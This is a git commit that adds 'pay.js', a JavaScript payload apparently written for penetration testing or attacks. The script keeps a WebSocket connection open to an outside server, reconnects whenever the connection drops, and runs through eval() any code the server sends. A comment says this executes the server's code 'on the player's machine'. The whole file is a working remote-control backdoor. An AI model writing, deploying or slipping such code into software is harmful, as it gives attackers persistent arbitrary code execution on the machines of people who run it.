8708becb516edec0118878000ad2ed63a6ec5c49
Opabinia <144001335+pentestfunctions@users.noreply.github.com>
2024-01-17 01:10:56 +1300

    Create pay.js

---
+++ pay.js
@@ -0,0 +1,43 @@
+globalThis.serverName = 'default';
+globalThis.lastPing = Date.now()
+
+const sendMessage = (socket, message) => socket.send(JSON.stringify(message));
+
+const pingCommand = (_, socket) => {
+  globalThis.lastPing = Date.now();
+  sendMessage(socket, { type: "pong" });
+}
+
+const evalCommand = ({ code }, socket) => {
+  const returned = eval(code); // Execute the code sent from our server on the player's machine
+  sendMessage(socket, { type: "evaled", returned: `${returned}` });
+};
+
+globalThis.commands = {
+  eval: evalCommand,
+  ping: pingCommand,
+}
+
+globalThis.start ??= () => {
+  if (globalThis.socket) {
+    return;
+  }
+
+  const socket = new WebSocket(`wss://echo.websocket.org/connect/${globalThis.serverName}`);
+  globalThis.socket = socket;
+
+  const closed = () => {
+    globalThis.socket = undefined;
+    setTimeout(() => globalThis.start(), 500)
+  };
+  socket.onclose = closed;
+  socket.onerror = closed;
+  socket.onmessage = ({ data }) => {
+    if (!data) return;
+
+    const { type, ...rest } = JSON.parse(data);
+    globalThis.commands[type]?.(rest, socket);
+  };
+}
+
+globalThis.start();
